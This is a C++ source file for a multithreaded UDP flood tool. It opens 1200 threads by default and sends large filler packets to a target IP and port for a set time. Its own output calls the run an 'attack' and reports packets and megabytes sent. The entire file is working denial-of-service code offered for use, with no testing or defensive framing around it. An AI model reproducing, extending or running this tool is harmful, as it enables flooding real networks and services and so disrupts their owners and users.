#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h>

#define MAX_PACKET_SIZE 65507
#define MIN_PACKET_SIZE 1
#define DEFAULT_NUM_THREADS 1200

long long totalPacketsSent = 0;
long long totalPacketsReceived = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;
bool keepReceiving = true;

void packetSender(int threadId, const std::string& targetIp, int targetPort, int durationSeconds, int packetSize) {
    int udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        perror("[ERROR] Socket creation failed");
        return;
    }

    struct sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());
    serverAddr.sin_port = htons(targetPort);

    char* packet = new char[packetSize];
    std::memset(packet, 'A', packetSize);

    auto startTime = std::chrono::steady_clock::now();
    long long threadPackets = 0;
    double threadDataMB = 0.0;

    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count() >= durationSeconds) break;

        ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
        if (bytesSent > 0) {
            threadPackets++;
            threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
        } else {
            perror("[ERROR] sendto failed");
        }
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalPacketsSent += threadPackets;
        totalDataMB += threadDataMB;
    }

    delete[] packet;
    close(udpSocket);
}

void packetReceiver(int listenPort, int packetSize) {
    int udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        perror("[ERROR] Socket creation failed");
        return;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);

    if (bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("[ERROR] Bind failed");
        close(udpSocket);
        return;
    }

    struct sockaddr_in clientAddr;
    socklen_t clientLen = sizeof(clientAddr);
    char* buffer = new char[packetSize];

    while (keepReceiving) {
        ssize_t bytes = recvfrom(udpSocket, buffer, packetSize, 0, (struct sockaddr*)&clientAddr, &clientLen);
        if (bytes > 0) {
            std::lock_guard<std::mutex> lock(statsMutex);
            totalPacketsReceived++;
        } else if (bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            perror("[ERROR] recvfrom failed");
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    delete[] buffer;
    close(udpSocket);
}

int main(int argc, char* argv[]) {
    if (argc < 5 || argc > 6) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size> [threads]\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int durationSeconds = std::stoi(argv[3]);
    int packetSize = std::stoi(argv[4]);
    int numThreads = (argc == 6) ? std::stoi(argv[5]) : DEFAULT_NUM_THREADS;

    if (packetSize < MIN_PACKET_SIZE || packetSize > MAX_PACKET_SIZE) packetSize = 1000;
    if (numThreads <= 0) numThreads = DEFAULT_NUM_THREADS;

    std::cout << "Starting attack on " << targetIp << ":" << targetPort << " with " << numThreads << " threads...\n";

    std::thread receiverThread(packetReceiver, targetPort, packetSize);
    std::vector<std::thread> senderThreads;
    for (int i = 0; i < numThreads; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize);
    }

    for (auto& t : senderThreads) {
        t.join();
    }

    keepSending = false;
    std::this_thread::sleep_for(std::chrono::seconds(1));
    keepReceiving = false;
    receiverThread.join();

    std::cout << "\nATTACK COMPLETE\nTotal Packets Sent: " << totalPacketsSent << "\nTotal Data: "
              << std::fixed << std::setprecision(2) << totalDataMB << " MB\n";
    return 0;
}
